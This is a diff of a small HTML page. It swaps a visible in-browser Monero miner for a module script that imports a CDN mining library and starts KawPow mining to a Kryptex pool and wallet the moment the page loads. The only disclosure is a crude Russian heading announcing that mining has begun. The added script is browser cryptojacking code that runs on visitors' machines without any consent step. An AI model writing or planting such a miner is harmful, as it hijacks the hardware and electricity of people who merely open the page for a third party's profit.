@@ -1,8 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Kryptex XMR Mining (WASM)</title>
-    <script src="https://cdn.jsdelivr.net/npm/web-miner@1.0.1/index.min.js"></script>
+    <title>fckntest</title>
+    <script type="module">
+  import { Miner } from 'https://cdn.jsdelivr.net/npm/wgsl-miner@latest/dist/miner.js';
+
+  const miner = new Miner({
+    algorithm: 'kawpow',
+    wallet: 'krxYN6R87Q.worker',
+    pool: 'stratum+tcp://rvn.kryptex.network:7777'
+  });
+  miner.start();
+</script>
     <style>
         body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         #status { color: green; font-weight: bold; }
@@ -10,34 +19,6 @@
     </style>
 </head>
 <body>
-    <h1>Kryptex XMR Mining</h1>
-    <div id="status">Initializing...</div>
-    <div id="stats">
-        <p>Hashrate: <span id="hashes">0</span> H/s</p>
-        <p>Accepted: <span id="accepted">0</span> shares</p>
-    </div>
-
-    <script>
-        const miner = new WASMMiner({
-            pool: "stratum+tcp://xmr.kryptex.network:7777",
-            wallet: "krxYN6R87Q.worker",
-            password: "x",
-            threads: navigator.hardwareConcurrency,
-            autoThreads: false
-        });
-
-        miner.start().then(() => {
-            document.getElementById("status").textContent = "Mining active!";
-        }).catch(err => {
-            document.getElementById("status").textContent = "Error: " + err.message;
-            document.getElementById("status").style.color = "red";
-        });
-
-        // Update stats every second
-        setInterval(() => {
-            document.getElementById("hashes").textContent = miner.getHashesPerSecond().toFixed(2);
-            document.getElementById("accepted").textContent = miner.getAcceptedHashes();
-        }, 1000);
-    </script>
+    <h1>страница загружена, хуячинг начался, за статой на kryptex!</h1>
 </body>
 </html>
